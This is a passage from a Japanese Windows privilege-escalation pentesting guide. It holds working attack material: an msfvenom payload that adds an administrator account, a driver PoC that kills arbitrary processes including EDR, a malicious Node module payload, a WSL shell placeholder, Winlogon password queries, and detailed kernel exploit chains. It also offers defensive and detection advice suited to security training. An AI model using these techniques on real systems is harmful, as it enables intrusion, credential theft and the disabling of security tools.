**metasploit を使ってこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploit を使ってサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。そのバイナリを置き換え可能なら、権限昇格が可能な場合があります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトターゲット

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` だけでなく、**action arguments** に指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定する場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しがリテラルで含まれている場合は、参照されるスクリプトの ACL も調べてください。変数、条件分岐、シェルの連結は手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトや親ディレクトリが、アカウントをまたぐ実行につながるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限られます。スクリプトでは追記のみ可能な ACL が問題になる場合がありますが、先行する `exit` などの制御フローによって、追記した行が実行されないこともあります。権限昇格を主張する前に、実効 ACL、[タスク実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリの確認中にスクリプトを変更したり、タスクを起動したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが存在していても、通常のディレクトリ一覧には表示されないことがあります。アクセス可能なバックアップファイルや設定ファイルのうち、対象を絞った少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では、[`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) および PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) で確認できます。秘密情報を示唆するストリーム名は、あくまで手がかりにすぎません。そのファイルへの実効読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、そしてその認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の出力を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクやサービスがある場合、ヘルパー実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスによって、そのアカウントのコンテキストでコマンドを実行できる可能性があります。特権アカウントで実行されるプロセスがこれらのファイルを読み込むことと、**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールされたタスクについては、そのアクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手がかりにすぎず、タスクがそこで入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる場合があります）と、**フォルダー**の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行していた、旧バージョンの Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている完全なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようにブランチだけを示すバージョンでは、影響の有無を判断できません。列挙では、ファイルを作成したり agent のコマンドを実行したりせずに、バージョン、サービスの状態、Temp のアクセス権を調べられます。

#### ADSelfService Plus SAML service の確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は ADSelfService Plus の build 6210 以前に影響し、ベンダーは build 6211 で修正しました。SAML SSO が有効になっている、または過去に有効だった場合にのみ関係します。そのため、インストール済み製品の情報やサービスのパスは手掛かりにすぎず、脆弱性の判定にはなりません。正確な build、SAML 設定の履歴、サービスのネットワーク到達性、実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、SYSTEM で動作するインスタンスに限られます。製品の Backup ディレクトリに読み取り可能な `OfflineBackup_*.ezip` があっても、それは別個の暗号化バックアップの手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示すものではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows の Jenkins controller では、job の作成・設定権限と、job の起動権限を区別してください。[Jenkins ではこれらを `Job/Create`、`Job/Configure`、`Job/Build` の別々の権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別の build 経路になる場合もありますが、それが有効で、実際に build が実行されることを確認してください。実行時の ID は controller または選択された agent のものとなり、保存された認証情報を使用できるのは、job がそのスコープにアクセスできる場合に限られます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスも確認してください。Jenkins は認証情報と暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけでは、パスワードが判明するわけではありません。**必要なファイルへの読み取りアクセス**と、アカウントを再利用する別の経路を確認してください。共有出力に秘密情報を表示しないでください。そのアカウントに AD user-object の `scriptPath` への書き込み権限がある場合は、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオンまたはスケジュール実行のコンシューマーがあることを確認してから、ユーザーをまたぐ実行と判断してください。さらにグループを制御できるかどうかは、有効な AD 権限を別途確認する必要があります。

#### Azure Pipelines self-hosted agent の実行 ID

Azure DevOps Server または Azure Pipelines の project では、pipeline の**作成または編集**権限と、それを**キューに登録**して選択した agent pool を使用する権限を分けて確認してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)をそれぞれ説明しています。権限の低いアカウントが script step を送信し、その pipeline を self-hosted Windows agent で実行できる場合、その step は[agent に設定されたオペレーティングシステムのアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザーをまたぐ権限昇格や SYSTEM への移行を主張する前に、対象の pipeline、ブランチやリソースの制限、認可された pool、実行可能な job、agent service の実行 ID を確認してください。agent のインストール、project の role、または repository への書き込み権限だけでは、手掛かりにすぎません。受動的な列挙中に build を開始せず、権限とローカルの service メタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期 service を実行して SQL database にアクセスする **ADSync service account** と、権限が設定済みの同期機能に応じて決まる **AD DS connector account** を区別しています。connector の認証情報はその database に暗号化されて保存され、鍵のマテリアルは[ADSync service account の下で DPAPI により保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期 service がインストールされていること、ローカル管理者を連想させる名前のグループ、または database を参照できることだけでは、復号可能な認証情報やドメイン権限の昇格があるとは判断できません。実際の database 読み取り権限、service account と鍵へのアクセス、インストールおよび SQL の構成、設定された connector の ID、その ID が持つ実効 AD 権限を個別に確認してください。通常の列挙では service とアクセスのメタデータのみを表示し、保存された秘密情報の照会や出力は行わないでください。

#### プリンタードライバーの support DLL のアクセス権

インストール済みプリンタードライバーは `C:\ProgramData` の下に support DLL を保持し、より高い権限を持つ print process で読み込むことがあります。プリンターの WMI 列挙が拒否される場合でも、親ディレクトリや reparse point を含め、対象のドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver の問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みが説明されています。書き込み可能な ACL は手掛かりにすぎません。拒否エントリを考慮した実効書き込み権限、該当ドライバーがインストールされていること、特権 ID でそのファイルが読み込まれること、ベンダーの更新済みドライバーやセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから、脆弱性があると判断しないでください。

### Write Permissions

特別なファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内のアクセス権が弱いフォルダーやファイルを見つける方法の 1 つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoloadによる永続化/実行

Notepad++は、`plugins`サブフォルダー内のplugin DLLを自動的にロードします。書き込み可能なポータブル版/コピー版が存在する場合、悪意のあるpluginを配置すると、起動するたびに（`DllMain`やplugin callbackからも）`notepad++.exe`内でコードが自動実行されます。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認します。**\
**以下のページを読み、権限昇格に利用できる興味深い** **autorunsの場所について詳しく学びます。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーがないか探します。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler によく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順の詳細はこちらを参照してください:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel exploitation 関連資料:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、race の時間枠を数マイクロ秒から数十マイクロ秒に延ばせます:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain は、単体では弱い2つの bug から構築できる場合があります。1つは queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済み paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploit に関するメモ:

- **lock 中に解放し、その後 cancel**: success path が **Acquire -> CompleteRequest/free -> Release** の順に処理し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** の順に処理する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放済み queue object を、同じサイズの攻撃者制御 paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entry は payload とサイズを制御でき、後から pipe read/peek operation で内容を調べられるため有用です。解放済み object に list link が含まれている場合は、これらを **user memory 内の fake request node の循環 list** で上書きし、ドライバーが元の list head で停止せず、攻撃者が定義した request structure を繰り返し処理するようにします。
- **予測可能な write を強化する**: fake request によって bookkeeping write（timestamp / QPC / refcount 近傍の field）に使われる nested context pointer を差し替えられると、**書き込み先アドレスは制御できるが、書き込む値は制御できない** kernel write を得られる場合があります。その場合は、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、spray を列挙して、破損した object から **out-of-bounds paged-pool read** が得られるものを探します。
- **race 可能な disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力な候補です。攻撃者がコピー対象の buffer を拡大できる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、信頼性が向上します。コピー時間が長くなることで、マシンをクラッシュさせずに置き換えの時間枠を広げられるためです。
- **pointer を多く含む refill target**: Windows **I/O ring** の registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。array を leak して周囲の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、後続の I/O ring operation に攻撃者が偽造した entry を使わせ、arbitrary kernel read/write を実現できます。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` 由来の値）しか与えない場合は、**unaligned write を重ねて** `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を組み立て、`VirtualAlloc` でその領域を map し、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意のカーネル読み書きを取得したら、標準的な primitive 取得後の手順で SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損 primitive

最新の hive 脆弱性では、決定論的なメモリレイアウトを整えたり、書き込み可能な HKLM/HKU の子キーを悪用したり、メタデータの破損をカスタムドライバーなしでカーネル paged-pool のオーバーフローに変換したりできます。攻撃の全手順はこちらです。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスを使った `RtlQueryRegistryValues` direct-mode の型混同

一部のドライバーは、ユーザーランドからレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、スタック上の `int readValue` などのスカラー変数を `RTL_QUERY_REGISTRY_DIRECT` に指定して `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に基づいて解釈されます。

これにより、次の2つの有用な primitive が得られます。<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` により、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログからキーの存在を漏らしたり、呼び出し元が直接アクセスできない値を読み取らせたりできる場合があります。
- **カーネルメモリ破損**: `&readValue` のようなスカラー型の格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定のバイナリバッファとして型混同されます。

実践的な悪用上の注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive** を照会すると、カーネル呼び出し元は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能性を維持するには、`HKCU` 配下に値を用意するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive への値の用意**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**低整合性**トークンでもスキャンを再実行して、sandbox 化されたコンテキストからアクセス可能なキーを探します。<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`に8-byteの値を直接書き込むと、隣接するスタックデータが破損し、近くのコールバック／関数ポインターが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込んだ後、同じバッファーを文字列読み込みに再利用すると、攻撃者は`Length`／`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半制御のカーネル書き込みが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファーサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。多くの場合、これはコールバックポインターを完全に上書きする最も簡潔な方法です。

有力なハンティングパターン: **再初期化せずに、異なる型のレジストリ値を同じスタック変数に読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、最初のレジストリ読み込みによって2回目の読み込みを行うかどうかが決まるコードパスをgrepしてください。

#### デバイスオブジェクトにおけるFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティ製driverは、IoCreateDeviceSecureで強固なSDDLを指定してデバイスオブジェクトを作成する一方、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがないと、余分なコンポーネントを含むパスからデバイスを開く際にセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがデバイスを開けるようになると、driverが公開する特権IOCTLを悪用してLPEや改ざんを行えます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（オフラインでの改ざん、ブート時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、カーネル経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する際は、必ずFILE_DEVICE_SECURE_OPENを設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPLチェックを追加してください。
- IOCTLを制限し（アクセスマスク、METHOD_*、入力検証）、カーネルの特権を直接使う代わりに、ブローカーを介する方式を検討してください。

防御側の検知アイデア
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンと、悪用を示す特定のIOCTLシーケンスを監視してください。
- Microsoftの脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを維持してください。


## PATH DLL Hijacking

**PATH上のフォルダー内に書き込み権限がある**場合、プロセスが読み込むDLLをハイジャックして**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのアクセス権を確認してください：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron モジュール解決の hijacking

これは、`require("foo")` のような bare import を実行した際に、想定されるモジュールが**存在しない**場合に **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートまで達することがあるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に調べる可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**より高い権限で動作する Node/Electron プロセス**が存在しない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として、昇格されたスケジュールタスク／サービスラッパーから、または自動起動する特権デスクトップアプリとして実行される場合、これは **LPE** になります。

これは、特に次のような場合によく見られます。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除された、パッケージング時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインのアプリケーションコードではなく、依存関係ツリーの深い場所にある

### 脆弱なターゲットの調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` の下で最後に成功したオープンに注目する

展開した `.asar` ファイルやアプリケーションのソースコードで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から、**不足しているパッケージ名**を特定します。
2. 存在しない場合は、root lookup ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される正確な名前でモジュールを配置します。

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際に存在するオプションモジュールの例として `bluebird` や `utf-8-validate` があります。ただし、再利用可能なのは **technique** です。特権で動作する Windows Node/Electron プロセスが解決する、任意の **存在しない bare import** を見つけてください。

### 検知とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、新しい `.js` ファイルやパッケージを書き込んだりした場合にアラートを出します。
- 高整合性プロセスによる `C:\node_modules\*` からの読み込みを調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合は、オプションのプローブを無効にします（たとえば、一部の `ws` のデプロイでは `WS_NO_UTF_8_VALIDATE=1` を指定すると、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている、ほかの既知のコンピューターを確認する】【。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する。

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるのは、認証とコマンド制御の設定がそれを許可している場合に限られます。より高い権限のアカウントで実行されるカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリパスはあくまで受動的な手掛かりであり、認証を経てメモリ破損を引き起こす経路を確認するには、そのバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールだけでは、宛先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall ルール

[**Firewall 関連コマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートで待ち受けできます（`nc.exe` で初めてポートを待ち受けるとき、ファイアウォールで `nc` を許可するかどうかをGUIで確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

rootとしてbashを簡単に起動するには、`--default-user root`を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダーで`WSL`のファイルシステムを確認できます。

WSL内のLinuxの`root`であっても、それだけでWindowsのAdministrator権限が得られるわけではありません。現在のWindows IDでディストリビューションのファイルシステムを読み取れる場合は、`/root/.bash_history`を含むシェル履歴ファイルを確認し、認証情報が記録されている可能性のあるコマンドを探してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs`という構成は古いWSLインストールに適用されます。WSL 2では通常、ディストリビューションは[`ext4.vhdx`仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙時に履歴の内容を表示するのは避けてください。

## Windowsの認証情報

### Winlogonの認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

